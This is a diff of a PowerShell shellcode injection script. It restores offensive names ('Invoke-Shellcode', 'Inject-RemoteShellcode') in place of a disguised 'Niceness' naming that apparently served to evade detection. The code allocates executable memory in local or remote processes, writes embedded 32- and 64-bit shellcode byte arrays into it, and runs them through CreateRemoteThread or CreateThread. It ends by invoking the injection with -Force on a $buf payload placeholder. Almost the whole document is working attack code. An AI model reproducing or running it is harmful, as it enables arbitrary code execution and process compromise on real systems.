@@ -1,4 +1,4 @@
-function Invoke-Niceness
+function Invoke-Shellcode
 {
 
 
@@ -9,7 +9,7 @@ function Invoke-Niceness
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    $Niceness,
+    $Shellcode,
     [Switch]
     $Force = $False
 )
@@ -39,7 +39,7 @@ function Invoke-Niceness
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-
+        Write-Output $TypeBuilder.CreateType()
     }
     function Local:Get-ProcAddress
     {
@@ -61,7 +61,7 @@ function Invoke-Niceness
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-
+        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
     function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
     {
@@ -71,13 +71,13 @@ function Invoke-Niceness
             $LittleEndianByteArray = New-Object Byte[](0)
             $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
             [System.Array]::Reverse($LittleEndianByteArray)
-
+            Write-Output $LittleEndianByteArray
         }
         $CallStub = New-Object Byte[](0)
         if ($IntSizePtr -eq 8)
         {
-            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &Niceness
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Niceness
+            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
             $CallStub += 0xFF,0xD0                              # CALL  RAX
             $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
             $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
@@ -86,17 +86,17 @@ function Invoke-Niceness
         }
         else
         {
-            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &Niceness
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Niceness
+            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
             $CallStub += 0xFF,0xD0                              # CALL  EAX
             $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
             $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
             $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
             $CallStub += 0xFF,0xD0                              # CALL  EAX
         }
-
+        Write-Output $CallStub
     }
-    function Local:Play-RemoteNiceness ([Int] $ProcessID)
+    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
     {
         $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
         if (!$hProcess)
@@ -109,61 +109,61 @@ function Invoke-Niceness
             $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
             if ((!$IsWow64) -and $PowerShell32bit)
             {
-                Throw 'Niceness Playion targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
+                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
             }
             elseif ($IsWow64) # 32-bit Wow64 process
             {
-                if ($Niceness32.Length -eq 0)
+                if ($Shellcode32.Length -eq 0)
                 {
-                    Throw 'No Niceness was placed in the $Niceness32 variable!'
+                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 }
-                $Niceness = $Niceness32
-
-
+                $Shellcode = $Shellcode32
+                Write-Verbose 'Injecting into a Wow64 process.'
+                Write-Verbose 'Using 32-bit shellcode.'
             }
             else # 64-bit process
             {
-                if ($Niceness64.Length -eq 0)
+                if ($Shellcode64.Length -eq 0)
                 {
-                    Throw 'No Niceness was placed in the $Niceness64 variable!'
+                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 }
-                $Niceness = $Niceness64
-
+                $Shellcode = $Shellcode64
+                Write-Verbose 'Using 64-bit shellcode.'
             }
         }
         else # 32-bit CPU
         {
-            if ($Niceness32.Length -eq 0)
+            if ($Shellcode32.Length -eq 0)
             {
-                Throw 'No Niceness was placed in the $Niceness32 variable!'
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
             }
-            $Niceness = $Niceness32
-
+            $Shellcode = $Shellcode32
+            Write-Verbose 'Using 32-bit shellcode.'
         }
-        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Niceness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$RemoteMemAddr)
         {
-            Throw "Unable to allocate Niceness memory in PID: $ProcessID"
+            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
         }
-
-        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Niceness, $Niceness.Length, [Ref] 0) | Out-Null
+        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
+        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
         if ($IsWow64)
         {
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
-
+            Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
-
+            Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
         $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$RemoteStubAddr)
         {
             Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
         }
-
+        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"
         $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
         $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
@@ -171,53 +171,53 @@ function Invoke-Niceness
             Throw "Unable to launch remote thread in PID: $ProcessID"
         }
         $CloseHandle.Invoke($hProcess) | Out-Null
-
+        Write-Verbose 'Shellcode injection complete!'
     }
-    function Local:Play-LocalNiceness
+    function Local:Inject-LocalShellcode
     {
         if ($PowerShell32bit) {
-            if ($Niceness32.Length -eq 0)
+            if ($Shellcode32.Length -eq 0)
             {
-                Throw 'No Niceness was placed in the $Niceness32 variable!'
+                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 return
             }
-            $Niceness = $Niceness32
-
+            $Shellcode = $Shellcode32
+            Write-Verbose 'Using 32-bit shellcode.'
         }
         else
         {
-            if ($Niceness64.Length -eq 0)
+            if ($Shellcode64.Length -eq 0)
             {
-                Throw 'No Niceness was placed in the $Niceness64 variable!'
+                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 return
             }
-            $Niceness = $Niceness64
-
+            $Shellcode = $Shellcode64
+            Write-Verbose 'Using 64-bit shellcode.'
         }
-        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Niceness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$BaseAddress)
         {
-            Throw "Unable to allocate Niceness memory in PID: $ProcessID"
+            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
         }
-
-        [System.Runtime.InteropServices.Marshal]::Copy($Niceness, 0, $BaseAddress, $Niceness.Length)
+        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
+        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
         if ($PowerShell32bit)
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
-
+            Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
-
+            Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
         $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$CallStubAddress)
         {
             Throw "Unable to allocate thread call stub."
         }
-
+        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"
         [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
         $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
@@ -226,8 +226,8 @@ function Invoke-Niceness
         }
         $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
         $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-        $VirtualFree.Invoke($BaseAddress, $Niceness.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-
+        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        Write-Verbose 'Shellcode injection complete!'
     }
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
     $AddressWidth = $null
@@ -257,14 +257,14 @@ function Invoke-Niceness
     {
         $PowerShell32bit = $false
     }
-    if ($PSBoundParameters['Niceness'])
+    if ($PSBoundParameters['Shellcode'])
     {
-        [Byte[]] $Niceness32 = $Niceness
-        [Byte[]] $Niceness64 = $Niceness32
+        [Byte[]] $Shellcode32 = $Shellcode
+        [Byte[]] $Shellcode64 = $Shellcode32
     }
     else
     {
-        [Byte[]] $Niceness32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
+        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                   0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
@@ -277,7 +277,7 @@ function Invoke-Niceness
                                   0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
-        [Byte[]] $Niceness64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
@@ -312,11 +312,11 @@ function Invoke-Niceness
         $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
         $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
         $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
-
+        Write-Verbose "Injecting shellcode into PID: $ProcessId"
         if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
-                 "Playing Niceness Playing into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
+                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
         {
-            Play-RemoteNiceness $ProcessId
+            Inject-RemoteShellcode $ProcessId
         }
     }
     else
@@ -333,12 +333,15 @@ function Invoke-Niceness
         $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
         $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
-
-            Play-LocalNiceness
-        
+        Write-Verbose "Injecting shellcode into PowerShell"
+        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
+                 "Injecting shellcode into the running PowerShell process!" ) )
+        {
+            Inject-LocalShellcode
+        }
     }   
 }
 
-#$$$SCODE$$$
+$$$SCODE$$$
 
-Invoke-Niceness -Niceness $buf -Force
+Invoke-Shellcode -Shellcode $buf -Force
